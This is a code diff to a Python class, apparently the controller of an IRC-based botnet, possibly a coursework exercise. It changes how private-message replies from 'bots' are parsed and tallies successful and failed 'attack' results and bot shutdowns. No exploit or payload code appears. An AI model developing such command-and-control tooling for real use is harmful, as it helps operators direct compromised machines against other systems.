@@ -47,28 +47,38 @@ class Controller_Client:
         # self.log("done")
 
         # check if msg is a DM
-        if ("PRIVMSG" in response) and (self.channel not in response):
-            self.__parse_response(command, response)
+        self.__parse_response(command, response)
     
+    # receives and handles the response from the bots
     def __parse_response(self, command, response):
         response_dict = {}
         for line in response.strip().split('\n'):
-            # get the sender's ID
-            sender = line.split(':')[1].split(' ')[0].split('!')[0]
-            # get the message sent by the sender
-            message = line.split(' :')[1].strip()
-            response_dict[sender] = message
+            # ignore responses that are not private messages
+            if ("PRIVMSG" in line) and (self.channel not in line):
+                # get the sender's ID
+                sender = line.split(':')[1].split(' ')[0].split('!')[0]
+                # get the message sent by the sender
+                message = line.split(' :')[1].strip()
+                response_dict[sender] = message
 
         if command == "status":
             bot_list = []
-            for sender in response_dict:
-                bot_list.append(sender)
+            for bot in response_dict:
+                bot_list.append(bot)
             self.log("Found " + str(len(bot_list)) + " bots: " + ", ".join(bot_list))
             return True
         
         if command.startswith("attack") or command.startswith("move"):
-            for sender in response_dict:
-                self.log(sender + ": " + message)
+            successful = 0
+            unsuccessful = 0
+            for bot in response_dict:
+                self.log(bot + ": " + response_dict[bot])
+                if "Successful" in response_dict[bot]:
+                    successful += 1
+                elif "Failed" in response_dict[bot]:
+                    unsuccessful += 1
+            self.log("Total: " + str(successful) + " successful, " + \
+                     str(unsuccessful) + " unsuccessful")
             return True
         
         elif command == "quit":
@@ -76,8 +86,13 @@ class Controller_Client:
             return True
         
         elif command == "shutdown":
+            total_sd = 0
+            for bot in response_dict:
+                self.log(bot + ": " + response_dict[bot])
+                if response_dict[bot] == "Shutting Down...":
+                    total_sd += 1
+            self.log("Total: " + str(total_sd) + " bots shut down")
             return True
-        
         else:
             return False
 
